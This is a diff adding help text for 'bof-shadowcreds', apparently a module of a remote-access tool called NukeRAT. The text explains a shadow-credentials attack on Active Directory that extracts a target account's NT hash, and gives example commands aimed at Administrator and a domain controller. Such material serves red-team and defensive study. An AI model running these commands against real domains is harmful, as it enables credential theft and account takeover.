@@ -1,0 +1,23 @@
+ABOUT
+    Writes a KeyCredential to the target msDS-KeyCredentialLink attribute,
+    authenticates via PKINIT, extracts the NT hash via UnPAC the hash, then
+    removes the shadow credential. Requires write access to the target msDS-
+    KeyCredentialLink attribute.
+USAGE:
+    bof-shadowcreds --- <target> <domain> [kdc]
+
+ARGUMENTS:
+    target              sAMAccountName of target user or computer
+    domain              Domain FQDN (e.g. corp.local)
+    kdc                 Optional domain controller hostname or IP
+
+EXAMPLES:
+    bof-shadowcreds --- Administrator corp.local
+    bof-shadowcreds --- DC01$ corp.local dc01.corp.local
+
+NUKERAT FLAGS:
+    -w <seconds>    Maximum wait time until timeout
+    -bg             Fork and run without waiting for output
+
+    Example:
+    bof-shadowcreds -w 60 --- Administrator corp.local
